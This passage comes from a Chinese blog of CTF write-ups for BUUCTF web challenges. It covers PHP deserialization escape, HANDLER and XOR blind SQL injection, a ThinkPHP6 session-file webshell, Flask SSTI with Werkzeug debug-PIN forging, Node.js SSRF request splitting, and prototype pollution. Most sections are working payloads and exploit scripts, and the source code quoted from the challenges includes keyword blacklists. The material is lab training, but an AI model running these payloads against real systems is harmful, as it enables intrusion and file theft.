username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见要让我们的payload逃逸出来，必须多出265个字符，一个字符用一个union 替换为hacker，可见需要265个union，即nickname为： 1unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 序列化一下并用safe函数处理： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1590:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125;&quot;;&#125; 可见可以逃逸出来，因此payload： 1age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 登录页面 用户名admin 密码任意： [WEB]Blacklist题目分析首先查询，发现和强网杯的很像 因此尝试堆叠注入，过滤字符： 因此无法改名，也无法用预处理语句。 通过查资料 发现可以利用handler语句 可见flag在FlagHere表 Getflag构造语句查一下第一行数据： 123通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。 通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。 通过HANDLER tbl_name CLOSE来关闭打开的句柄。 11&#39;;handler &#96;FlagHere&#96; open;handler &#96;FlagHere&#96; read first;handler &#96;FlagHere&#96; close; 直接查到了flag。 [WEB]Ezsqli题目分析sql注入题目，通过测试发现是整数型注入，过滤的函数比较多， 利用burpsuit-fuzz过滤的函数： 发现and、or等函数都过滤了： 发现^没有过滤，采用^测试注入点： 12id&#x3D;1^0%23id&#x3D;1^1%23 返回错误 返回正确。 发现存在注入。 接下来就构造注入语句，因为过滤了or，所以无法使用information_schema 绕过函数： 12345sys.schema_auto_increment_columnssys.schema_table_statistics_with_buffersys.x$schema_table_statistics_with_buffersys.x$schema_flattened_keysjoin无列名注入 构造查表语句： 判断逻辑：返回Nu1L说明payload为1对，语句成立 返回Error Occured When Fetch Result payload为0，语句不成立 12查表名：id&#x3D;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;)^1 可见表名：f1ag_1s_h3r3_hhhhh 下面用无列名注入，利用到了ascii位偏移： 两个字符串比较时利用首字符的ascii码 核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1) //子查询之间也可以直接通过&gt;、&lt;、=来进行判断。 测试字段： 123select 1select 1,2select 1,2,3 构造payload： 1id&#x3D;1^((select 1,&#39;f&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))^1 可见Nu1L页面的上一位就是我们要查询的值. Getflag 成功查询到flag。 [WEB]EasyThinking题目分析题目存在注册，登录，搜索功能，注册后登录搜索测试，发现个人中心会显示搜索记录。根据首页信息： 猜测搜索处存在利用点。扫描目录发现存在www.zip，下载源码审计，发现是TP框架，找到功能点核心代码：发现search 处session存储，同时TP是6.0版本： 参考：https://paper.seebug.org/1114/ 参考：https://xz.aliyun.com/t/8409 TP6session文件存储存在的任意文件操作漏洞，我们可以写入shell，文件路径\\runtime\\session，文件名为32位就可以，构造后缀为.php的32位字符串，访问sess_+文件名 漏洞利用从注册的时候开始修改： 注册后search 页面 提交key，先写入&lt;?php phpinfo();?&gt; 然后访问看下：http://xx/runtime/session/sess_b1d19886ab14c0d8340ddf637c17.php 写入一句话，蚁剑连接发现执行不了命令，看下phpinfo： 发现需要bypass disable_functions，php版本为7.3，直接利用蚁剑插件 php7-Backtrace-UAF bypass: [WEB]FlaskApp题目分析根据题目提示是个flask的base64加密、解密程序，加密结果会在首页显示，还存在一个hint页面： 查看源码发现提示PIN 猜测可能是Flask debug Pin码攻击，现在重点就是结合其他漏洞获取必要信息，通过反复测试发现解密的时候输入非base64，识别不了就会报错，同时可以查看部分源码： 可以看到如果输入的值解密后能够绕过waf，那么就会执行。那么现在的思路就是构造payload然后base64加密，之后解密执行。 漏洞利用采用if条件语句防止被过滤： 123456789&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX0NCnslIGlmIGMuX19uYW1lX189PSdjYXRjaF93YXJuaW5ncycgJX0NCnt7IA0KYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignYXBwLnB5JywgJ3InKS5yZWFkKCkNCn19DQp7JSBlbmRpZiAlfQ0KeyUgZW5kZm9yICV9 可以得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from flask import Flask,render_template_stringfrom flask import render_template,request,flash,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapimport base64app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = &#x27;s_e_c_r_e_t_k_e_y&#x27;bootstrap = Bootstrap(app)class NameForm(FlaskForm): text = StringField(&#x27;BASE64加密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)class NameForm1(FlaskForm): text = StringField(&#x27;BASE64解密&#x27;,validators= [DataRequired()]) submit = SubmitField(&#x27;提交&#x27;)def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1def hint(): txt = &quot;失败乃成功之母！！&quot; return render_template(&quot;hint.html&quot;,txt = txt)def encode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64encode(text.encode()) tmp = &quot;结果 :&#123;0&#125;&quot;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&#x27;encode&#x27;)) else : text = &quot;&quot; form = NameForm(text) return render_template(&quot;index.html&quot;,form = form ,method = &quot;加密&quot; ,img = &quot;flask.png&quot;)def decode(): if request.values.get(&#x27;text&#x27;) : text = request.values.get(&quot;text&quot;) text_decode = base64.b64decode(text.encode()) tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode()) if waf(tmp) : flash(&quot;no no no !!&quot;) return redirect(url_for(&#x27;decode&#x27;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&#x27;decode&#x27;)) else : text = &quot;&quot; form = NameForm1(text) return render_template(&quot;index.html&quot;,form = form, method = &quot;解密&quot; , img = &quot;flask1.png&quot;)def not_found(name): return render_template(&quot;404.html&quot;,name = name)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True) 1[&#39;SECRET_KEY&#39;] &#x3D; &#39;s_e_c_r_e_t_k_e_y&#39; 重点在waf： 123456def waf(str): black_list = [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] for x in black_list : if x in str.lower() : return 1 可见过滤了命令执行常用函数，不能采用命令执行的方式。 继续读一下必要信息： 1234567891011121314username #读取&#x2F;etc&#x2F;passwd&#x2F;&#x2F;本题：flaskwebmodname #flask.appgetattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))为Flaskgetattr(mod, &#39;__file__&#39;, None)为flask目录下的一个app.py的绝对路径&#x2F;&#x2F;本题通过报错得到路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.pyuuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式&#x2F;&#x2F;获取方式：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#x2F;&#x2F;本题：02:42:ac:10:af:49 转化为十进制(python print(0x0242ac10af49)) 2485377871689get_machine_id()&#x2F;&#x2F;读取&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值&#x2F;&#x2F;windows读取注册表：SOFTWARE\\\\Microsoft\\\\Cryptography&#x2F;&#x2F;docker下：&#x2F;proc&#x2F;self&#x2F;cgroup&#x2F;&#x2F;本题：0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249 exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*-coding:utf-8# From https://xz.aliyun.com/t/2553import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;flaskweb&#x27;,# username &#x27;flask.app&#x27;,# modname &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),]private_bits = [ &#x27;2485377871689&#x27;,#str(uuid.getnode()), /sys/class/net/ens0/address &#x27;0f9cec5a9c55ef59cc02311c79ae092fb42cafa6e918bac08ea04a94f320c249&#x27;# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 信息修改完整后运行得到 pin码：410-898-797 读文件： 123import osos.listdir(&#x27;/&#x27;)os.popen(&#x27;cat /this_is_the_flag.txt&#x27;).readlines() 有大佬直接利用读文件非预期了，我们知道可以读取任意文件，Payload： 1&#123;&#123;&#39;&#39;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125; 1234567&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/categories/Writeup/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"BUUCTF-GYCTF2020","slug":"BUUCTF-GYCTF2020","date":"2021-04-19T13:10:00.000Z","updated":"2021-05-02T15:26:50.243Z","comments":true,"path":"2021/04/19/BUUCTF-GYCTF2020/","link":"","permalink":"https://v1sun.github.io/2021/04/19/BUUCTF-GYCTF2020/","excerpt":"","text":"BUUCTF-GYCTF2020[WEB]Node Game代码审计可以查看源码，代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;);var http = require(&#x27;http&#x27;);var pug = require(&#x27;pug&#x27;);var morgan = require(&#x27;morgan&#x27;);const multer = require(&#x27;multer&#x27;);app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));app.use(morgan(&#x27;short&#x27;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;); var html = pug.renderFile(file); res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: &#x27;&#x27;, &#125; if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123; obj.msg=&quot;only admin&#x27;s ip can use it&quot; res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = &#x27;upload failed&#x27;; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: &#x27;upload success&#x27;, filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = &#x27;upload failed&#x27;; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get(&#x27;/source&#x27;, function(req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function(req, res) &#123; var q = req.query.q; var resp = &quot;&quot;; if (q) &#123; var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding(&#x27;utf8&#x27;); resp.on(&#x27;error&#x27;, function(err) &#123; if (err.code === &quot;ECONNRESET&quot;) &#123; console.log(&quot;Timeout occurs&quot;); return; &#125; &#125;); resp.on(&#x27;data&#x27;, function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(&quot;search param &#x27;q&#x27; missing!&quot;); &#125;&#125;)function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;) 通过审计发现存在以下功能： 1234&#39;&#x2F;&#39; &#x2F;&#x2F;indexpost &#x2F;file_upload &#x2F;&#x2F;文件上传get &#x2F;source &#x2F;&#x2F;查看源码get &#x2F;core &#x2F;&#x2F;存在SSRF 漏洞分析核心代码分析： get /core 存在SSRF，对我们传入的q参数进行拼接： 1url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q 然后通过blacklist函数进行验证，blacklist函数： 12345678910function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; 对敏感函数进行了过滤。 post /file_upload 是个文件上传的地方，需要满足以下条件： 1ip.includes(&#39;127.0.0.1&#39;) 首页还存在提示： 存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。 提示了pug，同时模板渲染采用的是pug引擎： 看一下 pug 引擎文档： 从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。 1234567//- index.pugdoctype htmlhtml head style include style.css 思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。 漏洞利用构造post请求，采用抓包的方法获取上传请求： 直接上传会提示： 构造exp：利用nodejs ssrf构造post请求 1234567891011121314151617181920212223242526272829303132333435363738394041#-*-coding:utf-8import urllib.parseimport requestspayload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: keep-aliveContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442Content-Length: 317-----------------------------303312354614442Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;Content-Type: &#x2F;..&#x2F;template&#x2F;&#x2F;- v1sun.pugdoctype htmlhtml head style include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt -----------------------------303312354614442--GET &#x2F;flag HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39;payload &#x3D; payload.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)#print (urllib.parse.quote(payload))r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))print(r.text) Content-Type处存在一个小trick，利用nodejs的目录穿越，上传到模板目录： 1Content-Type: &#x2F;..&#x2F;template 同时要修改：Connection: keep-alive 以至于让我们的所有请求包含进去 上传后访问：?action=v1sun 查看源码就得到flag [WEB]Ez_Express题目分析 但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456 下载源码 代码审计审计发现是nodejs：app.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var createError = require(&#x27;http-errors&#x27;);var express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);var cookieParser = require(&#x27;cookie-parser&#x27;);var logger = require(&#x27;morgan&#x27;);const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)var indexRouter = require(&#x27;./routes/index&#x27;);var app = express();// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.disable(&#x27;etag&#x27;);app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.use(&#x27;/&#x27;, indexRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);module.exports = app; app.js没什么特别关注的点。 index.js： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123; if(!req.session.user)&#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName=undefined; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123; res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)module.exports = router; 看到了js原型链污染漏洞的标志性函数：merge 应该就是原型链污染了。 但是看到： ADMIN用户才可以触发clone 进而利用merge。但是限制了admin注册，看下注册登陆处： 注册处会有验证，但是后边写入session的时候会经过toUpperCase()函数的处理，不由得想到了nodejs的大小写转换特性： 对于toUpperCase(): 1字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot; 对于toLowerCase(): 1字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K) 在绕一些规则的时候就可以利用这几个特殊字符进行绕过 漏洞利用可见我们要想得到ADMIN 可以注册admın 经过处理就得到ADMIN： 成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在outputFunctionName，并且res.outputFunctionName=undefined;在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问： 12Content-Type: application&#x2F;json&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: 